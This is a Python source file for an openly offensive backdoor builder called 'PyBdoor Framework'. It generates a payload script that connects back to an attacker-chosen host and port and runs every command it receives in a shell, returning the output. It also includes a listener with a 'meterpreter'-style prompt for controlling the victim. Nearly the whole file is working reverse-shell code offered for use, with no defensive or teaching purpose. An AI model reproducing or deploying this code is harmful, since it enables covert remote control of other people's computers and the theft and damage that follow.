# Hello
# i Am VPNC

import socket
import time
import sys
import os 
import colorama
from termcolor import colored
from colorama import Fore
from colorama import Style

colorama.init()

print("")
os.system('cls' if os.name == 'nt' else 'clear')
def banner():
	print(Fore.RED + Style.BRIGHT + '''            
 (                                    
 )\ )        (    (                   
(()/( (    ( )\   )\ )           (    
 /(_)))\ ) )((_) (()/(  (    (   )(   
(_)) (()/(((_)_   ((_)) )\   )\ (()\  
| _ \ )(_))| _ )  _| | ((_) ((_) ((_) 
|  _/| || || _ \/ _` |/ _ \/ _ \| '_| 
|_|   \_, ||___/\__,_|\___/\___/|_|   
      |__/    

      PyBdoor Framework''' + Style.RESET_ALL)
	print(Fore.GREEN)
	print("Copyright : ph4mch13n")
	print("Twitter : @Anonym0us_VNPC")
	print("Tele : https://t.me/Anon0psNews")
	print("Github : /Phamchie" + Style.RESET_ALL)
	print('''
========================================================
| command                 options                      |
========================================================  
| set host         set ip system attack                |
| set port         set port system attack              |
|                                                      |
| set filename     Created File Backdoor               |
|                                                      |
| options          show options                        |
| help             helping for tools                   |
| run              run session exploit victim          |
| exploit          run exploit victim                  |
========================================================''')

banner()

print("")
print("type help")
print("")

lhost = '127.0.0.1'
lport = '4444'

filename = 'null'

session = True
while session:
	print(Style.RESET_ALL)

	red = {Fore.RED}
	white = {Fore.WHITE}

	text_main = input("pybdoor(backdoor) > ")

	if text_main == "help":
		print("")
		print('''
========================================================
| command                 options                      |
========================================================  
| set host         set ip system attack                |
| set port         set port system attack              |
|                                                      |
| set file         Created File Backdoor               |
|                                                      |
| options          show options                        |
| help             helping for tools                   |
| run              run session exploit victim          |
| exploit          run exploit victim                  |
========================================================
''')
		print("")

	elif text_main == "set host":
		lhost = input("HOST : ")
		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set LHOST : " + Fore.GREEN + f"{lhost}")

	elif text_main == "set port":
		lport = input("PORT : ")
		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set LPORT : " + Fore.GREEN + f"{lport}")

	elif text_main == "set file":
		filename = input("File Name : ")
		code = f'''
import socket
import subprocess
import time
import os

os.system('cls' if os.name == 'nt' else 'clear')

ip = '{lhost}'
port = {lport}

s = socket.socket(socket.AF_INET, 
	socket.SOCK_STREAM)

s.setsockopt(socket.SOL_SOCKET, 
	socket.SO_REUSEADDR, 
	1)

s.connect((ip, 
	port))

print('[+] Starting Setup Bottom...')

while True:
	cmd = s.recv(1024)
	if cmd == b'exit':
		print("[+] Session Close")
		s.close()
		break

	elif cmd == b'system_info':

		s.send(b'uname -a')

	else:
		proc = subprocess.Popen(cmd, 
			shell=True, 
			stdout=subprocess.PIPE, 
			stderr=subprocess.PIPE, 
			stdin=subprocess.PIPE)

		output = proc.stdout.read() + proc.stderr.read()
		
		s.send(output)
		'''

		with open(f'{filename}.py', 'w') as file:
			file.write(code)

		print(Fore.BLUE + "[*]" + Style.RESET_ALL + f" set filename " + Fore.GREEN + f"{filename}.py")


	elif text_main == "options":
		print(f'''
======================================
| options | IP              | PORT   |   
|=====================================
| LHOST   : {Fore.GREEN}{lhost}         {lport}{Style.RESET_ALL}
======================================

=======================
| options |  File name|
=======================
| FILENAME | {Fore.GREEN}{filename}.py{Style.RESET_ALL}
=======================
''')

	elif text_main == "exploit":

		import socket
		import sys

		ip = str(lhost)
		port = int(lport)

		s = socket.socket(socket.AF_INET,
			socket.SOCK_STREAM)

		s.bind((ip, port))

		s.setsockopt(socket.SOL_SOCKET, 
			socket.SO_REUSEADDR, 
			1)
		
		s.listen(1)


		print("")
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On ' + Fore.GREEN + f'{lhost}:{lport}' + Style.RESET_ALL)
		time.sleep(2)
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Startingthe payload backdoor...')
		time.sleep(1)
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ Fore.GREEN + str(lhost) + ":" + str(lport) + '...' + Style.RESET_ALL)
		
		conn, addr = s.accept()
		
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', Fore.GREEN, addr)
		time.sleep(2)
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', Fore.GREEN, addr)
		time.sleep(1)
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ' + Fore.GREEN + str(addr) + '...' + Style.RESET_ALL)

		session_door = True

		while True:

		      sys.stdout.write(Fore.BLUE + f"\nmeterpreter > " + Style.RESET_ALL)
		      command = sys.stdin.readline()

		      if command == 'exit\n':
		          print('[+] Close')
		          conn.send(b"exit")
		          conn.close()
		          break  

		      elif command == 'system_info\n':
		      	usr = conn.send(b'uname -o')

		      elif command != '\n':
		          conn.send(command.encode())
		          output = conn.recv(1024)
		          print("\n", output)

	elif text_main == "run":

		import socket
		import sys

		ip = str(lhost)
		port = int(lport)

		s = socket.socket(socket.AF_INET,
			socket.SOCK_STREAM)

		s.bind((ip, port))

		s.setsockopt(socket.SOL_SOCKET, 
			socket.SO_REUSEADDR, 
			1)
		
		s.listen(1)


		print("")
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Starting Reverse Handler On ' + Fore.GREEN + f'{lhost}:{lport}' + Style.RESET_ALL)
		time.sleep(2)
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Startingthe payload backdoor...')
		time.sleep(1)
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server is listening on '+ Fore.GREEN + str(lhost) + ":" + str(lport) + '...' + Style.RESET_ALL)
		
		conn, addr = s.accept()
		
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' 1 target has open the file, service as started ', Fore.GREEN, addr)
		time.sleep(2)
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' wait for connecting session ', Fore.GREEN, addr)
		time.sleep(1)
		print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' session started ' + Fore.GREEN + str(addr) + '...' + Style.RESET_ALL)
		session_door = True

		while True:

		      sys.stdout.write(Fore.BLUE + f"\nmeterpreter > " + Style.RESET_ALL)
		      command = sys.stdin.readline()

		      if command == 'exit\n':
		          print('[+] Session Closed')
		          conn.send(b"exit")
		          conn.close()
		          break  

		      elif command == 'system_info\n':
		      	usr = conn.send(b'uname -o')

		      elif command != '\n':
		          conn.send(command.encode())
		          output = conn.recv(1024)
		          print(output)
